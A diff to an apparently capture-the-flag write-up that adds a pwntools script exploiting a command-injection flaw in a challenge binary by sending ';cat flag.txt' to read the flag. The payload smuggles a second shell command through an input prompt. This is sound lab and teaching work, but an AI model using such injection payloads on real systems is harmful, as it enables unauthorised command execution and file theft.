@@ -46,9 +46,39 @@ In the context of this code, if an attacker inputs a semicolon followed by a com
 the original command (generated using snprintf()), as well as the injected command concatenated by the semicolon.
 ```
 
+7. Let's craft our script then.
+
+> THE SCRIPT
+
+```
+from pwn import *
+import os
+#64 bit
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe], *a, **kw)
+
+exe = './task'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'debug'
+
+sh = start()
+
+sh.sendlineafter(b':', b';cat flag.txt') 
+
+#sh.recvlines()
+
+sh.interactive()
+
+```
+
 > RESULT
 
-![image](https://user-images.githubusercontent.com/70703371/221832156-203c62a0-245d-43e2-aced-816981a14b8c.png)
+![image](https://user-images.githubusercontent.com/70703371/221832583-2798c7f2-42a2-49cd-b3bb-2778c2c13734.png)
 
 
 7. Got the flag!
